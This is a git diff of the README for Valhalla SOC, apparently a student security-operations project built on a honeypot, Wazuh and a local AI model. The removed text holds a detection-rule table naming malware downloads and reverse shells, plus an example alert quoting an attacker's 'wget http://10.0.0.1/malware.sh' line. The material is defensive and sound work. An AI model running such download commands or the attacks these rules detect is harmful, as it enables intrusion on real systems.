@@ -1,637 +1,356 @@
 ![header](https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,2,5,30&height=200&section=header&text=VALHALLA%20SOC&fontSize=60&fontColor=fff&animation=twinkling&fontAlignY=35&desc=Centro%20de%20Operaciones%20de%20Seguridad%20con%20IA&descSize=18&descAlignY=55&descAlign=50)
 
-<div align="center">
+<p align="center">
+  <b><i>Un SOC completo que cabe en un portátil: detecta ataques reales, los investiga con IA local y los convierte en informes defendibles.</i></b>
+</p>
 
-[![Wazuh](https://img.shields.io/badge/Wazuh_SIEM-4.9.2-3AABE8?style=for-the-badge&logo=opensearch&logoColor=white)](https://wazuh.com)
-[![Cowrie](https://img.shields.io/badge/Cowrie_Honeypot-SSH%2FTelnet-FF6B6B?style=for-the-badge&logo=gnometerminal&logoColor=white)](https://github.com/cowrie/cowrie)
-[![Ollama](https://img.shields.io/badge/Ollama_AI-Local_LLM-000000?style=for-the-badge&logo=ollama&logoColor=white)](https://ollama.ai)
-[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docker.com)
+<p align="center">
+  <a href="LICENSE"><img alt="Licencia GPLv2" src="https://img.shields.io/badge/LICENCIA-GPLv2-4169A1?style=flat"/></a>
+  <img alt="Wazuh 4.9.2" src="https://img.shields.io/badge/Wazuh-4.9.2-3AABE8?style=flat&logo=opensearch&logoColor=white"/>
+  <img alt="FastAPI" src="https://img.shields.io/badge/FastAPI-Python%203.12-009688?style=flat&logo=fastapi&logoColor=white"/>
+  <img alt="React 19" src="https://img.shields.io/badge/React-19-61DAFB?style=flat&logo=react&logoColor=black"/>
+  <img alt="IA local" src="https://img.shields.io/badge/IA-LOCAL%20%C2%B7%20OLLAMA-000000?style=flat&logo=ollama&logoColor=white"/>
+  <img alt="Interfaz ES/EN" src="https://img.shields.io/badge/UI-ES%20%2F%20EN-2E8B57?style=flat"/>
+  <img alt="20 runbooks" src="https://img.shields.io/badge/20-RUNBOOKS%20NIST-CC8F00?style=flat"/>
+  <img alt="Cobertura ATT&CK" src="https://img.shields.io/badge/99%20de%20336-T%C3%89CNICAS%20ATT%26CK-8B1142?style=flat"/>
+</p>
 
-[![License](https://img.shields.io/badge/License-GPLv2-green?style=flat-square)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20Mac-blue?style=flat-square)]()
-[![ISO 27001](https://img.shields.io/badge/Compliance-ISO%2027001-orange?style=flat-square)]()
-[![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red?style=flat-square)](https://attack.mitre.org/)
+<p align="center">
+  <img src="docs/img/readme/overview.png" alt="Vista general de Valhalla SOC" width="880"/>
+</p>
 
----
+> Proyecto del Máster en Ciberseguridad (Evolve Academy) · Práctica 3: de prototipo a producto · Septiembre de 2026
 
-**SOC profesional que detecta ataques reales, los analiza con Inteligencia Artificial local y los presenta en dashboards interactivos.**
+**Valhalla SOC es un centro de operaciones de seguridad para laboratorio y equipos pequeños.** Un honeypot recibe ataques de verdad, Wazuh los detecta y los correlaciona, y una consola propia los convierte en trabajo de analista: triaje, incidentes con SLA, runbooks, caza de amenazas, inteligencia de vulnerabilidades e informes ejecutivos y de cumplimiento. Todo corre en local con Docker; la IA también, así que ningún dato del SOC sale de la máquina.
 
-*Proyecto de Máster en Ciberseguridad — 100% local, sin coste, alineado con privacidad y cumplimiento tipo ISO/IEC 27001.*
-
-</div>
-
----
-
-## Quick Start — Un solo comando
-
-**Windows (PowerShell como Administrador):**
-```powershell
-irm https://raw.githubusercontent.com/heindall92/Proyecto-Master-Ciberseguridad-Evolve-Yoandy/main/install.ps1 | iex
-```
-
-**Linux / macOS / WSL:**
-```bash
-curl -fsSL https://raw.githubusercontent.com/heindall92/Proyecto-Master-Ciberseguridad-Evolve-Yoandy/main/install.sh | bash
-```
-
-El script comprueba los requisitos, clona el repo, genera los secretos, levanta todos los contenedores y descarga el modelo de IA. En ~5 minutos tienes el SOC funcionando en `http://localhost:3000`.
-
-> **Requisitos mínimos:** Docker Desktop, Git, Python 3 · 8 GB RAM · 20 GB disco libre
+La regla del proyecto es sencilla: **ningún dato inventado**. Cada métrica sale del SIEM, de la base de datos o de una fuente pública citada, con su fórmula documentada; cuando falta un dato, la interfaz lo dice en lugar de rellenarlo.
 
 ---
 
 ## Índice
 
-<details>
-<summary> Haz clic para expandir</summary>
-
-1. [¿Qué es Valhalla SOC?](#-qué-es-valhalla-soc)
-2. [¿Cómo funciona? (Explicación simple)](#-cómo-funciona-explicación-simple)
-3. [Arquitectura del Sistema](#-arquitectura-del-sistema)
-4. [Componentes Principales](#-componentes-principales)
-5. [¿Qué es Ollama y qué hace aquí?](#-qué-es-ollama-y-qué-hace-aquí)
-6. [Capturas de Pantalla](#-capturas-de-pantalla)
-7. [Requisitos Previos](#-requisitos-previos)
-8. [Guía de Puesta en Marcha](#-guía-de-puesta-en-marcha)
-9. [Dashboards y Visualizaciones](#-dashboards-y-visualizaciones)
-10. [Estructura del Proyecto](#-estructura-del-proyecto)
-11. [Aplicación de Escritorio (Standalone)](#-aplicación-de-escritorio-standalone)
-12. [Preguntas Frecuentes (FAQ)](#-preguntas-frecuentes-faq)
-13. [Licencia y Créditos](#-licencia-y-créditos)
-
-</details>
+- [Cómo funciona](#cómo-funciona)
+- [Arquitectura](#arquitectura)
+- [Qué incluye](#qué-incluye)
+- [Capturas](#capturas)
+- [Trabajo en equipo y acceso remoto seguro](#trabajo-en-equipo-y-acceso-remoto-seguro)
+- [IA local](#ia-local)
+- [Arranque rápido](#arranque-rápido)
+- [Seguridad](#seguridad)
+- [Limitaciones conocidas](#limitaciones-conocidas)
+- [Estructura](#estructura)
+- [Licencia](#licencia)
+- [Autores](#autores)
 
 ---
 
-## ¿Qué es Valhalla SOC?
+## <img src="docs/assets/icons/route.svg" width="20" height="20" valign="middle"/> Cómo funciona
 
-<img align="right" width="150" src="https://img.shields.io/badge/-Valhalla_SOC-1a1a2e?style=for-the-badge&labelColor=e94560" />
+1. **El atacante llega al señuelo.** Cowrie simula un servidor SSH/Telnet vulnerable (puertos 2222/2223) y registra cada conexión, contraseña probada y comando. En el perfil de laboratorio, un contenedor Kali lanza ataques periódicos para que siempre haya actividad real que analizar.
+2. **Wazuh detecta y correlaciona.** El agente envía los registros al manager, que aplica reglas (fuerza bruta, acceso tras fuerza bruta, escaneo…) mapeadas a MITRE ATT&CK y las guarda en el indexador (OpenSearch).
+3. **Valhalla lo convierte en trabajo.** El backend (FastAPI) lee el SIEM, abre incidentes automáticamente según los monitores, calcula métricas (MTTR, cobertura ATT&CK, riesgo) y enriquece CVE con CISA KEV, NVD, GitHub y Exploit-DB.
+4. **El analista decide.** Desde la consola se investiga, se bloquea, se sigue un runbook, se habla con el equipo y se genera el informe, con la IA local como apoyo y nunca como fuente de datos.
 
-**Valhalla SOC** es un **Centro de Operaciones de Seguridad** (Security Operations Center) completo que:
+## <img src="docs/assets/icons/layers-3.svg" width="20" height="20" valign="middle"/> Arquitectura
 
-- **Despliega un honeypot** (una trampa) que simula ser un servidor real para atraer atacantes
-- **Detecta ataques en tiempo real** como fuerza bruta, ejecución de comandos maliciosos, descargas de malware y reverse shells
-- **Analiza cada amenaza con IA local** usando Ollama (sin enviar datos a la nube)
-- **Presenta todo en dashboards** profesionales con gráficas, tablas y métricas
-- **Mapea ataques al framework MITRE ATT&CK** para clasificarlos según estándares internacionales
-
-> **En palabras simples:** Es como poner una cámara de seguridad inteligente en internet que graba a los ladrones, analiza lo que hacen y te lo explica.
-
----
-
-## ¿Cómo funciona? (Explicación simple)
-
-Imagina un edificio con un sistema de seguridad completo:
-
-```
- Edificio → Tienda falsa → Cámaras → Analista IA → Monitor
-   (Internet) (Honeypot Cowrie) (Wazuh SIEM) (Ollama) (Dashboard)
-```
-
-### Paso a paso:
-
-| Paso | Componente | Qué sucede |
-|:---:|:---:|:---|
-| 1️⃣ | **Cowrie** | Se conecta a internet haciéndose pasar por un servidor SSH real. Los atacantes/bots lo encuentran e intentan entrar |
-| 2️⃣ | **Logs JSON** | Todo queda registrado: cada intento de login, cada comando, cada archivo descargado |
-| 3️⃣ | **Wazuh** | Lee esos registros en tiempo real y los clasifica: "fuerza bruta", "descarga de malware", "reverse shell" |
-| 4️⃣ | **Ollama** | Recibe las alertas más graves y las analiza con IA, explicando qué está haciendo el atacante |
-| 5️⃣ | **Dashboard** | Muestra todo de forma visual: gráficas, IPs atacantes, comandos ejecutados, mapeo MITRE ATT&CK |
-
----
-
-## Arquitectura del Sistema
-
-```
-                    ┌─────────────────────────────────────────────┐
-                    │ INTERNET / ATACANTES │
-                    └────────────────────┬────────────────────────┘
-                                         │
-                                    Puerto 2222
-                                         │
-                    ┌────────────────────▼────────────────────────┐
-                    │ COWRIE HONEYPOT │
-                    │ Simula SSH/Telnet real │
-                    │ Registra TODA la actividad en JSON │
-                    └────────────────────┬────────────────────────┘
-                              Volumen compartido
-                            (cowrie_logs)
-                                         │
-                    ┌────────────────────▼────────────────────────┐
-                    │ WAZUH MANAGER │
-                    │ Lee logs de Cowrie en tiempo real │
-                    │ Aplica reglas personalizadas │
-                    │ Clasifica alertas por severidad │
-                    │ Mapea a MITRE ATT&CK │
-                    │ │
-                    │ Cuando alerta nivel ≥ 5: │
-                    │ ────► Llama a Ollama para análisis IA │
-                    └──────────┬──────────────┬───────────────────┘
-                               │ │
-                    ┌──────────▼──────┐ ┌────▼──────────────────┐
-                    │ WAZUH │ │ OLLAMA (IA Local) │
-                    │ INDEXER │ │ Puerto 11434 │
-                    │ (OpenSearch) │ │ Modelo: qwen2.5 │
-                    │ Puerto 9200 │ │ Analiza amenazas │
-                    └──────────┬──────┘ └────────────────────────┘
-                               │
-                    ┌──────────▼──────────────────────────────────┐
-                    │ WAZUH DASHBOARD │
-                    │ Puerto 443 (HTTPS) │
-                    │ Dashboards interactivos │
-                    │ Reportes PDF/CSV │
-                    │ Alertas en tiempo real │
-                    └─────────────────────────────────────────────┘
+```mermaid
+flowchart LR
+    A[Atacante<br/>Kali · perfil labs] -->|SSH / Telnet| C[Cowrie<br/>honeypot]
+    C -->|registros| AG[Agente Wazuh]
+    AG --> M[Wazuh Manager<br/>reglas + ATT&CK]
+    M --> I[(Wazuh Indexer<br/>OpenSearch)]
+    I --> B[Backend<br/>FastAPI]
+    M -->|API| B
+    B <--> P[(PostgreSQL)]
+    B <--> O[Ollama<br/>IA local]
+    B -->|REST + WebSocket| F[Consola<br/>React 19]
+    F --> U((Analistas))
+    T[Tailscale<br/>HTTPS opcional] -.-> F
 ```
 
-### Pipeline de datos:
-
-```
-Atacante → SSH al Honeypot → Log JSON → Wazuh lee log → Aplica decoder →
-→ Aplica regla → Genera alerta → Envía a Ollama (si nivel ≥ 5) →
-→ IA analiza → Todo se indexa en OpenSearch → Dashboard lo muestra
-```
-
----
-
-## Componentes Principales
-
-### 1. Cowrie Honeypot — "La Trampa"
-
-<details>
-<summary> Más información</summary>
-
-**¿Qué es?** Un programa que simula ser un servidor SSH/Telnet real. Cuando un atacante se conecta, cree que está en un servidor de verdad, pero todo es falso.
-
-**¿Qué hace en Valhalla SOC?**
-- Escucha en el **puerto 2222** (SSH) y **2223** (Telnet)
-- Simula ser un servidor Ubuntu con OpenSSH 8.9
-- Permite que los atacantes "entren" con contraseñas comunes (root/admin, admin/password, etc.)
-- **Graba absolutamente todo**: cada tecla, cada comando, cada archivo descargado
-- Genera archivos de log en formato JSON
-
-**Archivo de configuración:** `cowrie_config/cowrie.cfg`
-
-</details>
-
----
-
-### 2. Wazuh — "El Cerebro del SIEM"
-
-<details>
-<summary> Más información</summary>
-
-**¿Qué es?** Wazuh es un SIEM (Security Information and Event Management) de código abierto. Es el sistema que recibe logs, los analiza y genera alertas.
-
-| Componente | Puerto | Función |
+| Contenedor | Qué hace | Puerto en el host |
 |---|---|---|
-| **Wazuh Manager** | 1514, 1515, 55000 | Lee los logs de Cowrie, aplica reglas, genera alertas, llama a Ollama |
-| **Wazuh Indexer** | 9200 | Base de datos (OpenSearch) que almacena todas las alertas |
-| **Wazuh Dashboard** | 443 | Interfaz web para ver dashboards, alertas y reportes |
+| `dashboard` | Consola React (Vite) y proxy hacia la API | `3000` |
+| `backend` | API FastAPI, WebSocket del chat, lógica del SOC | `8000` |
+| `postgres` | Usuarios, incidentes, runbooks, informes, auditoría, chat | — (solo red interna) |
+| `wazuh.manager` | Reglas, agentes, API de Wazuh | `1514`, `1515`, `55000` |
+| `wazuh.indexer` | Almacén de alertas e inventario (OpenSearch) | — (solo red interna) |
+| `wazuh.dashboard` | Consola nativa de Wazuh | `443` |
+| `cowrie` | Honeypot SSH/Telnet | `2222`, `2223` |
+| `ollama` + `ollama-init` | Modelo de IA local y su descarga inicial | `127.0.0.1:11434` |
+| `attacker`, `wazuh.agent` | Laboratorio: atacante automático y agente | perfil `labs` |
+| `ts-whois` | Identidad de Tailscale de cada sesión (solo lectura) | perfil `tailscale` |
 
-</details>
+## <img src="docs/assets/icons/list-checks.svg" width="20" height="20" valign="middle"/> Qué incluye
 
-**Reglas de detección personalizadas:**
-
-| ID Regla | Nivel | Qué detecta | MITRE ATT&CK |
-|---|---|---|---|
-| 100110 | 5 | Login fallido | — |
-| 100111 | 10 | Fuerza bruta (5+ fallos en 120s) | T1110 |
-| 100112 | 9 | Login exitoso en honeypot | T1078 |
-| 100113 | 12 | Login exitoso tras fuerza bruta | T1078, T1110 |
-| 100120 | 8 | Comando ejecutado | T1059 |
-| 100121 | 9 | Comandos de reconocimiento | T1082 |
-| 100130 | 13 | Descarga de malware (wget/curl) | T1105 |
-| 100140 | 15 | Reverse shell | T1059, T1071 |
-| 100150 | 14 | Desactivar firewall/seguridad | T1562 |
-| 100160 | 11 | Persistencia (crontab) | T1053 |
-| 100170 | 12 | Anti-forense (borrar logs) | T1070 |
-| 100180 | 12 | Escalada de privilegios | T1548 |
-
----
-
-## ¿Qué es Ollama y qué hace aquí?
-
-### ¿Qué es Ollama?
-
-**Ollama** es un programa que permite ejecutar **modelos de Inteligencia Artificial (IA)** directamente en tu ordenador, sin necesidad de internet ni servidores en la nube. Es como tener un "ChatGPT" local y privado.
-
-### ¿Por qué Ollama y no ChatGPT o la nube?
-
-| Característica | Ollama (Local) | ChatGPT / Nube |
-|---|---|---|
-| **Privacidad** | Los datos nunca salen de tu equipo | Los datos van a servidores externos |
-| **Coste** | Gratis, sin suscripciones | Pago por uso (costoso) |
-| **Cumplimiento normativo** | Alineado con ISO 27001, GDPR | Requiere acuerdos de procesamiento |
-| **Velocidad** | Sin latencia de red | Depende de la conexión |
-| **Disponibilidad** | Funciona sin internet | Requiere internet |
-
-### ¿Qué hace Ollama en Valhalla SOC?
-
-Ollama actúa como un **analista de seguridad automatizado**:
-
-```
-1. Wazuh detecta una amenaza (nivel ≥ 5)
-   ↓
-2. Wazuh ejecuta custom-ollama.py con la alerta en JSON
-   ↓
-3. El script construye un prompt:
-   "Eres un analista SOC. Alerta: 'Descarga de malware — wget
-    http://10.0.0.1/malware.sh' desde IP 185.220.101.1.
-    En 2 oraciones: describe el objetivo y el nivel de amenaza."
-   ↓
-4. Envía POST a http://host.docker.internal:11434/api/generate
-   ↓
-5. Ollama responde:
-   "El atacante está descargando un script malicioso desde un servidor
-    C2 para establecer persistencia. Nivel: CRÍTICO."
-   ↓
-6. La respuesta se indexa como alerta "Ollama AI Insight" (regla 100200)
-   ↓
-7. Aparece en el Dashboard
-```
-
-### Modelo de IA utilizado
-
-| Parámetro | Valor |
+| Sección | Qué resuelve |
 |---|---|
-| **Modelo** | `qwen2.5-coder:7b` (7 mil millones de parámetros) |
-| **Tamaño** | ~4.5 GB |
-| **Temperatura** | 0.3 (respuestas técnicas y deterministas) |
-| **Max tokens** | 150 (respuestas concisas, ~2 oraciones) |
+| **Vista general** | Alertas, críticas, agentes e incidentes del periodo; volumen, severidad y atacantes principales. |
+| **SIEM** | Alertas de Wazuh en vivo con filtros, técnicas ATT&CK observadas, creación de incidente y bloqueo en un clic. |
+| **Activos** | Equipos con agente: estado, sistema, último contacto e inventario de paquetes; guía de hardening de LSA en Windows. |
+| **Sistema** | Salud de cada integración, monitores de detección con umbrales editables y registro de auditoría. |
+| **Honeypots** | Sesiones de Cowrie reconstruidas paso a paso: contraseñas probadas, reglas que saltan y accesos tras fuerza bruta. |
+| **Inteligencia** | Reputación de IOCs (VirusTotal, AbuseIPDB) con lista de vigilancia; CVE explotadas (CISA KEV) priorizadas con CVSS, exploit público y ransomware; mapa de origen de ataques. |
+| **Bifröst** | Métricas del SOC (MTTR, antigüedad, resolución, cobertura ATT&CK) y 7 consultas de *threat hunting* exportables; capa para ATT&CK Navigator. |
+| **Runbooks** | 20 procedimientos de respuesta con las 5 fases de NIST SP 800-61 y comandos reales, con editor. |
+| **Workspace** | Kanban de incidentes (triaje → investigación → contención → resuelto) con SLA, asignación y evidencias con SHA-256. |
+| **Informes** | Informe SOC, resumen ejecutivo e **Informe GRC** (matriz de riesgo 5×5, radar NIST CSF 2.0, plan de tratamiento, cobertura ATT&CK y correspondencia ENS · ISO 27001 · NIS2 · ISO 42001). Cada informe queda congelado con su huella SHA-256 y clasificación TLP. |
+| **Usuarios** | Roles (administrador, analista, reportero, lector), sesiones en línea por dispositivo y red, e invitaciones de un solo uso. |
 
-### ¿Cómo se conecta Ollama con Docker?
+Además: chat de equipo con mensajes directos y `@ia`, notificaciones con sonido, buscador de comandos (`Ctrl + K`), centro de ayuda, tema claro y oscuro con acentos, interfaz en español e inglés y vista móvil con barra inferior.
 
-```
-Ollama (en tu PC, puerto 11434)
-        ↑
-        │ POST http://host.docker.internal:11434/api/generate
-        │
-Wazuh Manager (dentro de Docker)
-        │
-        └── Script: /var/ossec/integrations/custom-ollama
-```
+## <img src="docs/assets/icons/image.svg" width="20" height="20" valign="middle"/> Capturas
 
-> `host.docker.internal` es un nombre especial de Docker que significa "la IP de mi PC anfitrión vista desde dentro del contenedor".
+<table>
+<tr>
+<td width="50%"><img src="docs/img/readme/siem.png" alt="SIEM"/><br/><sub><b>SIEM</b> · alertas en vivo, ATT&CK y atacantes</sub></td>
+<td width="50%"><img src="docs/img/readme/honeypots.png" alt="Honeypots"/><br/><sub><b>Honeypots</b> · sesiones reconstruidas y credenciales probadas</sub></td>
+</tr>
+<tr>
+<td><img src="docs/img/readme/intel_vulns.png" alt="Inteligencia de vulnerabilidades"/><br/><sub><b>Inteligencia</b> · CVE explotadas priorizadas (CISA KEV + NVD + exploits)</sub></td>
+<td><img src="docs/img/readme/bifrost.png" alt="Bifröst"/><br/><sub><b>Bifröst</b> · métricas del SOC y threat hunting</sub></td>
+</tr>
+<tr>
+<td><img src="docs/img/readme/report_grc.png" alt="Informe GRC"/><br/><sub><b>Informe GRC</b> · matriz de riesgo, NIST CSF 2.0 y multinorma</sub></td>
+<td><img src="docs/img/readme/report_soc.png" alt="Informe SOC"/><br/><sub><b>Informe SOC</b> · periodo, TLP y huella de integridad</sub></td>
+</tr>
+<tr>
+<td><img src="docs/img/readme/workspace.png" alt="Workspace"/><br/><sub><b>Workspace</b> · incidentes con SLA en kanban</sub></td>
+<td><img src="docs/img/readme/runbooks.png" alt="Runbooks"/><br/><sub><b>Runbooks</b> · 20 procedimientos NIST SP 800-61</sub></td>
+</tr>
+<tr>
+<td><img src="docs/img/readme/assets.png" alt="Activos"/><br/><sub><b>Activos</b> · equipos con agente Wazuh</sub></td>
+<td><img src="docs/img/readme/system.png" alt="Sistema"/><br/><sub><b>Sistema</b> · salud de las integraciones</sub></td>
+</tr>
+<tr>
+<td><img src="docs/img/readme/users.png" alt="Usuarios"/><br/><sub><b>Usuarios</b> · roles y sesiones por dispositivo y red</sub></td>
+<td><img src="docs/img/readme/login.png" alt="Acceso"/><br/><sub><b>Acceso</b> · pantalla de inicio de sesión</sub></td>
+</tr>
+</table>
 
----
+<p align="center">
+  <img src="docs/img/readme/mobile_overview.png" alt="Vista móvil" width="260"/>
+  &nbsp;&nbsp;
+  <img src="docs/img/readme/mobile_intel.png" alt="Inteligencia en móvil" width="260"/>
+  <br/><sub><b>Vista móvil</b> · la misma consola, con barra inferior y paneles adaptados</sub>
+</p>
 
-## Capturas de Pantalla
+## <img src="docs/assets/icons/users.svg" width="20" height="20" valign="middle"/> Trabajo en equipo y acceso remoto seguro
 
-### Dashboard principal de Wazuh
-> Resumen de agentes, alertas de las últimas 24 horas, módulos de seguridad
+Valhalla está pensado para que **varias personas trabajen a la vez**:
 
-![Dashboard principal](docs/img/01-dashboard-principal.png)
+- **Roles con permisos reales en el servidor**: administrador, analista, reportero y lector. No se puede eliminar al último administrador, a uno mismo ni al usuario de sistema de la IA.
+- **Presencia**: quién está conectado, desde qué dispositivo y por qué red (local, VPN o internet). La IP solo la ven el administrador y el propio usuario.
+- **Chat de equipo** con canal global y mensajes directos que solo reciben sus dos participantes; `@ia` responde en el canal y, con «resumen del día», adjunta el informe.
+- **Invitaciones**: el administrador crea el usuario y comparte un mensaje (WhatsApp, correo, copiar o compartir) con un **enlace de activación de un solo uso** (24 h) para que el invitado elija su contraseña; en Valhalla solo se guarda su huella.
 
----
+**Acceso desde el móvil o desde fuera (opcional, con [Tailscale](https://tailscale.com)):**
 
-### Agente INFIERNO con MITRE ATT&CK
-> Tácticas detectadas: Evasión de Defensa, Acceso Inicial, Persistencia, Escalada de Privilegios
+- **Solo HTTPS**: `tailscale serve` publica la consola en `https://<máquina>.<tailnet>.ts.net` con certificado válido, y un cortafuegos (`scripts/vpn-firewall.sh`) cierra a la VPN todos los puertos de Docker, así que no hay forma de entrar sin cifrar.
+- **Se comparte solo la máquina del SOC**, no la red: con `TAILSCALE_API_KEY`, el botón «Invitar» genera el enlace de acceso de Tailscale de un solo uso.
+- **Identidad de cada sesión**: el contenedor `ts-whois` (sin privilegios, en una red interna a la que solo llega el backend) dice qué cuenta y qué dispositivo de Tailscale hay detrás de cada conexión. Al primer acceso por VPN se vincula la cuenta; si otro día entra con una distinta, salta una alerta y queda en la auditoría.
+- **Aviso en directo**: cuando alguien inicia sesión o activa su invitación, los administradores reciben una notificación con usuario, dispositivo y cuenta de VPN.
 
-![Agente MITRE](docs/img/02-agente-mitre.png)
+## <img src="docs/assets/icons/bot.svg" width="20" height="20" valign="middle"/> IA local
 
----
+La IA corre en [Ollama](https://ollama.com) dentro de Docker con **qwen2.5:3b-instruct**; no hay llamadas a servicios externos ni claves de API. Se usa para:
 
-### Dashboard Cowrie Honeypot (tiempo real)
-> 12.918 alertas críticas, timeline de eventos, top IPs atacantes, comandos ejecutados
+- **Triaje de alertas** con recomendación (riesgo, técnica ATT&CK, acción, probabilidad de falso positivo), apoyado en los runbooks y en MITRE (RAG).
+- **Asistente del chat** (`@ia`), con un glosario del SOC para no inventar términos.
+- **Resumen ejecutivo** opcional en los informes.
 
-![Cowrie Honeypot](docs/img/04-cowrie-honeypot.png)
+La IA **redacta, no aporta datos**: todas las cifras de informes y paneles se calculan en el backend. En CPU genera unas 3 palabras por segundo, por eso el resumen de los informes es opcional.
 
----
+## <img src="docs/assets/icons/rocket.svg" width="20" height="20" valign="middle"/> Arranque rápido
 
-### Dashboard de Reportes de Seguridad
-> Resumen por regla, top 20 IPs atacantes, cobertura MITRE ATT&CK
-
-![Reportes de Seguridad](docs/img/03-reportes-seguridad.png)
-
----
-
-### Monitores de alertas activos
-> 7 monitores habilitados: Brute Force, Login Exitoso, Malware, Reverse Shell, Evasión, Volumen Anómalo, Persistencia
-
-![Monitores](docs/img/07-monitores.png)
-
----
-
-### Detalle de alerta activa
-> Actividad Elevada - Advertencia, severidad 3 (Medio), monitor de Volumen Anómalo
-
-![Alerta activa](docs/img/06-alerta-activa.png)
-
----
-
-### Generación de informes PDF
-> Exportación directa desde el dashboard
-
-![Generación de informe](docs/img/09-generacion-informe.png)
-
----
-
-### Dashboard de Presentación del SOC
-> Vista principal del sistema Valhalla SOC con métricas en tiempo real
-
-![Dashboard Presentación](docs/img/10-dashboard-presentacion.png)
-
----
-
-### Interfaz de Acceso (Tactical Cyberpunk)
-> Pantalla de login rediseñada con efectos Glassmorphism y polígonos complejos
-
-![Login Valhalla](docs/img/11-login-valhalla.png)
-
----
-
----
-
-## Requisitos Previos
-
-### Hardware Mínimo
-
-| Recurso | Mínimo | Recomendado |
-|---|---|---|
-| **RAM** | 8 GB | 16 GB |
-| **CPU** | 4 cores | 8 cores |
-| **Disco** | 20 GB libres | 50 GB libres |
-| **GPU** | No necesaria | GPU NVIDIA (acelera Ollama) |
-
-### Software Necesario
-
-| Software | Para qué | Descargar |
-|---|---|---|
-| **Docker Desktop** | Ejecutar todos los servicios | [docker.com](https://www.docker.com/products/docker-desktop) |
-| **Ollama** | IA local | [ollama.ai](https://ollama.ai/download) |
-| **Git** | Clonar el repositorio | [git-scm.com](https://git-scm.com/downloads) |
-| **Python 3.8+** | Scripts de configuración | [python.org](https://www.python.org/downloads/) |
-
----
-
-## Dashboard Valhalla SOC (Frontend)
-
-Además del dashboard nativo de Wazuh, Valhalla SOC incluye un **dashboard propio** desarrollado con HTML/CSS/JS que se ejecuta en `http://localhost:3000`.
-
-### Características:
-- **Interfaz moderna** con visualización de amenazas en tiempo real
-- **Sistema de autenticación** con JWT
-- **Dashboard interactivo** con métricas del honeypot
-- **Gestión de tickets** SOC
-- **Exportación de reportes** en múltiples formatos
-
-### Componentes:
-| Componente | Puerto | Descripción |
-|---|---|---|
-| **Sistema Valhalla** | `3000` | Frontend (HUD) + Backend (API) unificados |
-
-### Iniciar el Dashboard:
-
-Toda la infraestructura se gestiona ahora a través de Docker:
+**Requisitos:** Docker (Desktop o Engine con Compose v2), Git y Python 3 · 8 GB de RAM (16 GB recomendados) · 25 GB libres · en Linux, `vm.max_map_count=262144` para el indexador.
 
 ```bash
-docker compose up -d --build
+# Linux / macOS / WSL
+git clone https://github.com/heindall92/Proyecto-Master-Ciberseguridad-Evolve-Yoandy.git valhalla-soc
+cd valhalla-soc
+./install.sh
 ```
 
----
+```powershell
+# Windows (PowerShell)
+git clone https://github.com/heindall92/Proyecto-Master-Ciberseguridad-Evolve-Yoandy.git valhalla-soc
+cd valhalla-soc
+.\install.ps1
+```
 
-## Guía de Puesta en Marcha
+El instalador hace, en este orden: comprueba requisitos → genera `.env` con secretos únicos → **genera los certificados TLS de Wazuh** → levanta el stack (con el laboratorio) → espera a que se descargue el modelo de IA (~2 GB) → configura el conector de vulnerabilidades de Wazuh. Opciones: `NO_LABS=1` / `-NoLabs` sin atacante ni agente, `SKIP_OLLAMA=1` / `-SkipOllama` sin modelo.
 
-> **Manual completo** disponible en [`MANUAL.md`](MANUAL.md)
-
-### Inicio rápido (primera vez)
-
-> Guía detallada: [`docs/INSTALACION_PRIMERA_VEZ.md`](docs/INSTALACION_PRIMERA_VEZ.md)
+<details>
+<summary><b>Instalación paso a paso</b> — lo mismo que hace el instalador, a mano</summary>
 
 ```bash
-# 1. Clonar el repositorio
-git clone https://github.com/heindall92/Proyecto-Master-Ciberseguridad-Evolve-Yoandy.git
-cd Proyecto-Master-Ciberseguridad-Evolve-Yoandy
+# 1. Secretos únicos en .env (SECRET_KEY, WEBHOOK_SECRET, ADMIN_PASSWORD, INDEXER_PASSWORD…)
+python3 scripts/setup_env.py
 
-# 2. Configurar secretos (NO copiar .env.example a mano)
-# Windows: setup.bat | Linux: ./scripts/setup_env.sh | make setup
-python scripts/setup_env.py
+# 2. Certificados TLS de Wazuh (no se versionan: cada instalación crea los suyos)
+bash scripts/gen_certs.sh
 
-# 3. Ollama + modelo IA
-ollama pull qwen2.5-coder:7b
-
-# 4. Levantar infraestructura
+# 3. Stack completo; sin "--profile labs" no se levantan el atacante ni el agente
 docker compose --profile labs up -d --build
 
-# 5. Wazuh (esperar 3-5 min tras paso 4)
-pip install requests
-python create_dashboards.py
-python setup_monitors.py
-python setup_reports.py
+# 4. Modelo de IA: lo descarga el servicio ollama-init; comprobar que está
+docker compose exec ollama ollama list
+
+# 5. Credenciales del indexador en el keystore del manager (inventario de vulnerabilidades)
+bash scripts/wazuh_post_install.sh
 ```
 
-En **Windows**, `Valhalla-Runner.bat` ejecuta el paso 2 automáticamente si falta `.env`.
+Si la contraseña de administrador se pierde: `docker compose exec backend python /opt/valhalla-scripts/reset_admin.py`.
 
-**Entrega limpia:** el repo no incluye tickets, chats ni usuarios de prueba. Solo `admin` tras el setup. Ver [`docs/INSTALACION_PRIMERA_VEZ.md`](docs/INSTALACION_PRIMERA_VEZ.md) (sección *Entrega limpia*).
+</details>
 
-### Acceder al Dashboard
+**Accesos** (las contraseñas están en tu `.env`):
 
-| Servicio | URL | Credenciales |
+| Servicio | Dirección | Usuario |
 |---|---|---|
-| **Valhalla SOC Dashboard** | `http://localhost:3000` | `admin` + contraseña elegida en el setup (`.env.setup-backup`) |
-| Dashboard Wazuh (Nativo) | `https://localhost` | admin / admin |
-| Wazuh API | `https://localhost:55000` | wazuh-wui / wazuh-wui |
-| OpenSearch | `https://localhost:9200` | admin / admin |
-| Honeypot SSH | `ssh localhost -p 2222` | ¡Es la trampa! |
-| Ollama API | `http://localhost:11434` | Sin autenticación |
+| Consola Valhalla SOC | `http://localhost:3000` | `admin` · `ADMIN_PASSWORD` |
+| API y documentación | `http://localhost:8000/docs` | token de sesión |
+| Consola de Wazuh | `https://localhost` | `admin` · `INDEXER_PASSWORD` |
+| Honeypot (¡es la trampa!) | `ssh root@localhost -p 2222` | cualquiera |
 
-### Simular ataques de prueba
+<details>
+<summary><b>Acceso remoto por VPN con HTTPS</b> (opcional)</summary>
 
 ```bash
-# Login fallido
-ssh root@localhost -p 2222
